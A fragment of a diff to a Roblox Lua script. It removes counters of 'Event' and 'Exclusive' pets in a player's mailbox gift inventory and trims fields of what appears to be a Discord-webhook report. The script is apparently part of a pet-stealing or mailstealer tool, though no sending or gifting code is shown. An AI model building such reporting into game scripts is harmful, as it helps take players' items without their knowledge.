@@ -1,30 +1,4 @@
-local Exclusive = 0
 
-for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetChildren()) do
-
-    if v:IsA("TextButton") then
-
-    	if v:FindFirstChild("RarityGradient"):FindFirstChild("Exclusive") then                    Exclusive = Exclusive + 1
-
-                end
-
-            end
-
-	end
-
-local Event = 0
-
-for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetChildren()) do
-
-    if v:IsA("TextButton") then
-
-    	if v:FindFirstChild("RarityGradient"):FindFirstChild("Event") then                    Event = Event + 1
-
-                end
-
-            end
-
-	end
 
 
 
@@ -126,37 +100,13 @@ local data1 = {
 
                 {
 
-                ["name"] = ":round_pushpin: Event Pets Remainin  :round_pushpin: ",
-
-                    ["value"] = "```>>> "..Event.."\nPetName:".._G.PetName.."```",
-
-                    ["inline"] = false
-
-                },
-
-                {
+                
 					
 					
 
-                    ["name"] = ":round_pushpin: Huge Pets Remainin  :round_pushpin: ",
+                   
 
-                    ["value"] = "```>>> "..Exclusive.."\nPetName:".._G.PetName.."```",
-
-                    ["inline"] = false
-
-                },
-
-                {
-
-                 ["name"] = ":round_pushpin: Exclusive Pets Remainin  :round_pushpin: ",
-
-                    ["value"] = "```>>> "..Exclusive.."\nPetName:".._G.PetName.."```",
-
-                    ["inline"] = false
-
-                },
-
-                {
+      
 					
 		
 
@@ -217,7 +167,7 @@ local data1 = {
 					
 					
 
-                    ["name"] = ":money_mouth: HUGE :money_mouth: ",
+                    ["name"] = ":money_mouth:".._G.PetRar..":money_mouth: ",
 
                     ["value"] = "```>>> ".._G.PetName.."```",
 
